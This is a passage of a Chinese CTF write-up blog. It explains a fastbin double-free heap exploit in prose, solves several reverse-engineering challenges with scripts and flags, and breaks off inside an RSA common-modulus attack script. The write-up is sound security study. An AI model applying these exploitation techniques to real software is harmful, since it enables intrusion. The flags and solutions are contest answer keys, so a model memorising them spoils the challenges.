<p>漏洞点在于<code>free</code>之后没有置指针为NULL，考虑<code>double free</code>。首先分配三个chunk，按<code>chunk0-&gt;chunk1-&gt;chunk0</code>的顺序释放，第二次释放<code>chunk0</code>时它不在对应fastbin的头部，因此不会被检测到。再申请两次分别得到<code>chunk3</code>和<code>chunk4</code>，按first-fit原则前者即<code>chunk0</code>，后者即<code>chunk1</code>，但此时<code>chunk0</code>依然会留在fastbin中。</p>
<p>接下来，我们在<code>target</code>附近伪造chunk。我们逆向发现<code>lair</code>在<code>target</code>上方8B处，因此先输入4，设置<code>lair=0x20</code>以伪造<code>chunk_size</code>。然后输入5得到<code>&amp;lair</code>，那么<code>&amp;lair-8</code>处就是伪造的chunk的chunk指针。伪造好以后，我们向<code>chunk3</code>即<code>chunk0</code>的<code>fd</code>写入<code>&amp;lair-8</code>。此时，fastbin内就变成了<code>chunk0-&gt;fake_chunk</code>，申请一次得到<code>chunk0</code>，第二次得到<code>fake_chunk</code>。</p>
<p>此时向<code>fake_chunk</code>写数据，等价于向<code>(&amp;lair-8) + 0x10</code>也就是<code>target</code>写数据，写入<code>0xdeadbeef</code>并退出程序即可。</p>
<p>ref: <a href="https://github.com/SignorMercurio/MetasequoiaCTF/tree/master/Pwn/Samsara" target="_blank" rel="noopener">Samsara</a></p>
</blockquote>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><p>re也都中规中矩，其中有一到smali的题，首次接触，涨了涨姿势</p>
<h2 id="CMCS"><a href="#CMCS" class="headerlink" title="CMCS"></a>CMCS</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>你主导开发的CMCS(<code>Cyber Malware Control Software</code>)可以对全球各个角落的网络爬虫进行监控。但是今天，它似乎失灵了……<br><strong>得到的flag请包上flag提交。</strong><br>By <em>?</em></p>
</blockquote>
</li>
<li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Reverse/CMCS/attachment.zip" target="_blank" rel="noopener">attachment.zip</a></p>
</li>
<li><p>考察点：逆向分析</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>初始分值：100</p>
</li>
<li><p>最终分值：91</p>
</li>
<li><p>完成人数：5</p>
</li>
</ul>
<p>主要代码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_8048708</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">wchar_t</span> ws[<span class="number">8192</span>]; <span class="comment">// [esp+1Ch] [ebp-800Ch]</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *s2; <span class="comment">// [esp+801Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s2 = sub_8048658(&amp;s, &amp;dword_8048A90);</span><br><span class="line">  <span class="keyword">if</span> ( fgetws(ws, <span class="number">0x2000</span>, <span class="built_in">stdin</span>) )&#123;</span><br><span class="line">    ws[wcslen(ws) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(ws, s2) )</span><br><span class="line">      wprintf(&amp;right);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      wprintf(&amp;failed);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>输入的字符串与<code>sub_8048658</code>的返回结果做比较，直接<code>gdb</code>调试，获取<code>sub_8048658</code>的返回值即为flag</p>
<blockquote>
<p>9447{you_are_an_international_mystery}</p>
</blockquote>
<p>9447 CTF 原题，flag都没改…</p>
<h2 id="babysmali"><a href="#babysmali" class="headerlink" title="babysmali"></a>babysmali</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>你似乎找到了破坏CMCS的软件，于是尝试对其进行逆向，希望能发现这一切背后的始作俑者……<br><strong>得到的 flag 请包上 flag{} 提交。</strong><br>By <em>?</em></p>
</blockquote>
</li>
<li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Reverse/Babysmali/attachment.zip" target="_blank" rel="noopener">attachment.zip</a></p>
</li>
<li><p>考察点：smali逆向、base64换表</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>初始分值：250</p>
</li>
<li><p>最终分值：245</p>
</li>
<li><p>完成人数：2</p>
</li>
</ul>
<p>先把smali转成java，再分析即可，用到的工具如下：</p>
<ul>
<li>smali.jar</li>
<li>dex2jar-2.0</li>
<li>jd-gui</li>
</ul>
<h3 id="smali-gt-dex"><a href="#smali-gt-dex" class="headerlink" title="smali-&gt;dex"></a>smali-&gt;dex</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> java -jar ./smali.jar ass ./src.smali</span></span><br></pre></td></tr></table></figure></div>

<h3 id="dex-gt-jar"><a href="#dex-gt-jar" class="headerlink" title="dex-&gt;jar"></a>dex-&gt;jar</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./d2j-dex2jar.sh ./out.dex</span></span><br></pre></td></tr></table></figure></div>

<h3 id="jar-gt-java"><a href="#jar-gt-java" class="headerlink" title="jar-&gt;java"></a>jar-&gt;java</h3><p>用jd-gui打开jar文件</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hellosmali.hellosmali;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Digest</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String paramString)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (paramString != <span class="keyword">null</span> &amp;&amp; paramString.length() != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">char</span>[] arrayOfChar = paramString.toCharArray();</span><br><span class="line">      StringBuilder stringBuilder2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      <span class="keyword">int</span> i;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arrayOfChar.length; i++) &#123;</span><br><span class="line">        String str1;</span><br><span class="line">        <span class="keyword">for</span> (str1 = Integer.toBinaryString(arrayOfChar[i]); str1.length() &lt; <span class="number">8</span>; str1 = <span class="string">"0"</span> + str1);</span><br><span class="line">        stringBuilder2.append(str1);</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">while</span> (stringBuilder2.length() % <span class="number">6</span> != <span class="number">0</span>)</span><br><span class="line">        stringBuilder2.append(<span class="string">"0"</span>); </span><br><span class="line">      String str = String.valueOf(stringBuilder2);</span><br><span class="line">      arrayOfChar = <span class="keyword">new</span> <span class="keyword">char</span>[str.length() / <span class="number">6</span>];</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arrayOfChar.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> j = Integer.parseInt(str.substring(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">        str = str.substring(<span class="number">6</span>);</span><br><span class="line">        arrayOfChar[i] = <span class="string">"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>.charAt(j);</span><br><span class="line">      &#125; </span><br><span class="line">      StringBuilder stringBuilder1 = <span class="keyword">new</span> StringBuilder(String.valueOf(arrayOfChar));</span><br><span class="line">      <span class="keyword">if</span> (paramString.length() % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        stringBuilder1.append(<span class="string">"!?"</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paramString.length() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">        stringBuilder1.append(<span class="string">"!"</span>);</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">return</span> String.valueOf(stringBuilder1).equals(<span class="string">"xsZDluYYreJDyrpDpucZCo!?"</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>自定义base64，写脚本解密：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">"xsZDluYYreJDyrpDpucZCo!?"</span>[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    l.append(table.index(i))</span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    b = bin(i)[<span class="number">2</span>:].rjust(<span class="number">6</span>,<span class="string">'0'</span>)</span><br><span class="line">    s += b</span><br><span class="line"></span><br><span class="line"><span class="comment"># print s</span></span><br><span class="line"></span><br><span class="line">h = hex(int(s,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-2</span>]</span><br><span class="line"><span class="comment"># print h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%h.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></div>



<h2 id="Prison"><a href="#Prison" class="headerlink" title="Prison"></a>Prison</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>你的发现触动了某些人的利益，他们将你囚禁了起来。为了活下去，你必须逃离这里！<br><strong>flag格式：flag{你的逃跑路线}</strong><br>By <em>?</em></p>
</blockquote>
</li>
<li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Reverse/Prison/attachment.zip" target="_blank" rel="noopener">attachment.zip</a></p>
</li>
<li><p>考察点：逆向分析地图题</p>
</li>
<li><p>难度：中等</p>
</li>
<li><p>初始分值：350</p>
</li>
<li><p>最终分值：335</p>
</li>
<li><p>完成人数：4</p>
</li>
</ul>
<p>走迷宫，地图是乱序给的，需要重新整理一下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">map = &#123;<span class="number">0</span>:<span class="string">"**########################################################################################"</span>,</span><br><span class="line"><span class="number">10</span>:<span class="string">"#************######*##############**************##*####*#######*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">22</span>:<span class="string">"###*#########*****************************************************************############"</span>,</span><br><span class="line"><span class="number">24</span>:<span class="string">"###*#########*###############################################*######*****************#####"</span>,</span><br><span class="line"><span class="number">21</span>:<span class="string">"###**********#############################################################################"</span>,</span><br><span class="line"><span class="number">1</span>:<span class="string">"#*######################*******************************************#####*************#####"</span>,</span><br><span class="line"><span class="number">20</span>:<span class="string">"############*#####*******************************************************************#####"</span>,</span><br><span class="line"><span class="number">15</span>:<span class="string">"###*#################################################*#########*##*######*#####*####*#####"</span>,</span><br><span class="line"><span class="number">16</span>:<span class="string">"###*####*****#####**********************#############*#########*##********#####*####*#####"</span>,</span><br><span class="line"><span class="number">2</span>:<span class="string">"#************************####*####################################*#####*###########*#####"</span>,</span><br><span class="line"><span class="number">18</span>:<span class="string">"###*####*###*#####*############################################*****************####*#####"</span>,</span><br><span class="line"><span class="number">17</span>:<span class="string">"###*####*###*#####*####################***************#########*###############*####*#####"</span>,</span><br><span class="line"><span class="number">3</span>:<span class="string">"#########*#########*#########*#######***************************##*#####*###########*#####"</span>,</span><br><span class="line"><span class="number">26</span>:<span class="string">"#############################################################*######*#####################"</span>,</span><br><span class="line"><span class="number">4</span>:<span class="string">"#******##*#########*#########*#######*#########################*##*#####*###########*#####"</span>,</span><br><span class="line"><span class="number">5</span>:<span class="string">"#*####*##*#########*#########*#######*#########################*##*#####********####*#####"</span>,</span><br><span class="line"><span class="number">19</span>:<span class="string">"###******###*#####*#################################################################*#####"</span>,</span><br><span class="line"><span class="number">23</span>:<span class="string">"###*#########*###############################################*############################"</span>,</span><br><span class="line"><span class="number">6</span>:<span class="string">"#*####*##*#########*######*******####*###**********####****####*##*############*####*#####"</span>,</span><br><span class="line"><span class="number">7</span>:<span class="string">"#*##***#**#########*#################*###*########*####*#######*##*############*####*#####"</span>,</span><br><span class="line"><span class="number">25</span>:<span class="string">"###**************************************************########*######*#####################"</span>,</span><br><span class="line"><span class="number">8</span>:<span class="string">"#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####"</span>,</span><br><span class="line"><span class="number">9</span>:<span class="string">"#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">11</span>:<span class="string">"###################*##############################*####***#####*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">12</span>:<span class="string">"###################********************************############*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">13</span>:<span class="string">"###############################################################*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">28</span>:<span class="string">"#########################*****************************************************************"</span>,</span><br><span class="line"><span class="number">14</span>:<span class="string">"###***************************************************#########*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">27</span>:<span class="string">"#############################################################*######*#####################"</span>,</span><br><span class="line"><span class="number">29</span>:<span class="string">"#*#######*####**###*#######***#######*########**###*******##*****##########################"</span>,</span><br><span class="line"><span class="number">30</span>:<span class="string">"##*#####*###*###*##*######*#########*#*######*##*#####*#####*##############################"</span>,</span><br><span class="line"><span class="number">31</span>:<span class="string">"###*###*####*###*##*######*##**####*###*####*#########*#####***############################"</span>,</span><br><span class="line"><span class="number">32</span>:<span class="string">"####*#*#####*###*##*##*###*###*###*******####*##*#####*#####*##############################"</span>,</span><br><span class="line"><span class="number">33</span>:<span class="string">"#####*#######**####****####**####*#######*####**######*#####*##############################"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">print</span> map[i]</span><br></pre></td></tr></table></figure></div>

<p>得到迷宫：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">**########################################################################################</span><br><span class="line">#*######################*******************************************#####*************#####</span><br><span class="line">#************************####*####################################*#####*###########*#####</span><br><span class="line">#########*#########*#########*#######***************************##*#####*###########*#####</span><br><span class="line">#******##*#########*#########*#######*#########################*##*#####*###########*#####</span><br><span class="line">#*####*##*#########*#########*#######*#########################*##*#####********####*#####</span><br><span class="line">#*####*##*#########*######*******####*###**********####****####*##*############*####*#####</span><br><span class="line">#*##***#**#########*#################*###*########*####*#######*##*############*####*#####</span><br><span class="line">#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####</span><br><span class="line">#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####</span><br><span class="line">#************######*##############**************##*####*#######*##*##*###*#####*####*#####</span><br><span class="line">###################*##############################*####***#####*##*##*###*#####*####*#####</span><br><span class="line">###################********************************############*##*##*###*#####*####*#####</span><br><span class="line">###############################################################*##*##*###*#####*####*#####</span><br><span class="line">###***************************************************#########*##*##*###*#####*####*#####</span><br><span class="line">###*#################################################*#########*##*######*#####*####*#####</span><br><span class="line">###*####*****#####**********************#############*#########*##********#####*####*#####</span><br><span class="line">###*####*###*#####*####################***************#########*###############*####*#####</span><br><span class="line">###*####*###*#####*############################################*****************####*#####</span><br><span class="line">###******###*#####*#################################################################*#####</span><br><span class="line">############*#####*******************************************************************#####</span><br><span class="line">###**********#############################################################################</span><br><span class="line">###*#########*****************************************************************############</span><br><span class="line">###*#########*###############################################*############################</span><br><span class="line">###*#########*###############################################*######*****************#####</span><br><span class="line">###**************************************************########*######*#####################</span><br><span class="line">#############################################################*######*#####################</span><br><span class="line">#############################################################*######*#####################</span><br><span class="line">#########################*****************************************************************</span><br></pre></td></tr></table></figure></div>

<p>耐心走完即可：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">raw=<span class="string">'r1,d2,r18,d10,r31,u6,l9,d2,r6,d2,l13,u2,r3,u5,r26,d15,r16,u13,l7,u4,r12,d19,l66,u4,r21,d1,r14,u3,l50,d5,r5,u3,r4,d5,l9,d4,r10,u3,r48,d6,r28'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> raw.split(<span class="string">','</span>):</span><br><span class="line">    op=i[<span class="number">0</span>]</span><br><span class="line">    tm=i[<span class="number">1</span>:]</span><br><span class="line">    flag+=op*eval(tm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%flag.upper()</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>flag{RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR}</p>
</blockquote>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>密码学3道题全是RSA，除了共模攻击，其余都不会，基本靠百度</p>
<h2 id="Ridicule"><a href="#Ridicule" class="headerlink" title="Ridicule"></a>Ridicule</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>你想要窃听Alice与Bob之间的通信，但他们使用了RSA加密，你无法破解。他们也知道这一点，为了嘲讽你，甚至把同一条消息发送了两次！<br>By <em>Mercurio</em></p>
</blockquote>
</li>
<li><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Crypto/Ridicule/attachment.zip" target="_blank" rel="noopener">题目附件</a></p>
</li>
<li><p>考察点：RSA共模攻击</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>初始分值：150</p>
</li>
<li><p>最终分值：124</p>
</li>
<li><p>完成人数：8</p>
</li>
</ul>
<p>RSA共模攻击<a href="https://www.jianshu.com/p/2d95bdd0fb0d" target="_blank" rel="noopener">参考</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">e2 = <span class="number">395327</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line">c1 = <span class="number">91305913831214369377952269118161386003598023255485037043787231386393955913536147951327587587463685458285050904908606519471516585546641448049728693190905879280840165324662394536944611092018044651371870986413401191811244830102613672620955502806522821766703471780501595829827875795245077468666876924554483719367619785416487802738542307755841705317059328580966011761532447398826642223971344197882218789319343867872361384139568302372092803096038907172887382345170895273112014635399900800642737687324107565370573604700095505442212165699978970932019423809817487089085601763117309208863650351775335912245447387452956788773428626555630061201067204115092554187354312571068755262098974796820411503610378273433454274777409673603938861625985976632847656111827263952716196589771597261150375688197316301237918777772060246839505840400511836084221123300725351892908105214743311210231911274804713194290807741144717602270672051963664718188579120547722073387555742534912295882639385513725274066607278662476330784799812834843237551921507530373632320031381036550506607567061408192533501338206431901557732808859610231949222985385162467033555818794827557794123641737919050344373856601672258488664080854100467312218803256169436644089734181008742490711580042</span></span><br><span class="line">c2 = <span class="number">704672807914934785540657591440512058022586636125385843168732955073514077655455813212009493863389059666899528836516095699125514067099710358014253776587605045075141314272189607334786100207510015707758739101384698920619364876535606210899911129217151741959517344988838631586846350008457359747129948031415545489245577138170245470822851099234206216384013980124363443997339235504467924028046028680088155373925683649047495400986970876581673756506916765485275724626482137125637187439908185652963713581266007823789444165379453792444581101766966160504792503774410227806705414033756780127831024884593928515162191834028847725582871710066858868947182430104633621199015107401148118418338824086178489351697402962464798943542690540041445116576626615679919422505195176433797369659680306125076741925059577683214898660950897895672017286721867404885976418884202714626278569772713938624652451293587114431454520793129201159777144870706434853118587971437409703156441560836614022558588075615856594959231216241788071137142857422791753028932100557615225152094338580103681806055204290166319011784438838989437111665407114828731652938898822052627483844276822323929616602820305955544961236345999748237725866983443344310328933228220159896431099123550617191875040204</span></span><br><span class="line">n = <span class="number">762292637561009841867381758891924078920161551681011409810119236902708316218732647411043943763437022249138626076545685661730482641366923692658850431766314218412351837270927506312564544720954923062726662877953440678352431207958623308285911531147439741895411339784197821335423242138644430759797990474398292665026255344351314097831344143699467288732880374170750860467471905921107741006885109935239227868010666908525916679008871504582450836566108323926895929095994914698970059270570182580904903005923375868411609696598681700414843568442218100923302843261091071533416388834137121589901414277494938275241081203545819980264192183417604433935106780970110122975048006585657632026810857827012062220556533199813923599855002754246118206960819774209743569779749774598608808112482297107880631488151767561999274962162175282851451341191623222413183297157111802280844016550160932800325073699005271344653372643829523557629478171849469222857004697685188375657637289718545309995206957844911728971581888022289420352845395758422056507873315923916458799916423955515257867605617687429492984387761566675577947632934213753257825601450323638701033675536654894676100626699720281478967866417903915072119409044838795907066746433347300603690475300736848821164691031</span></span><br><span class="line"><span class="keyword">if</span> 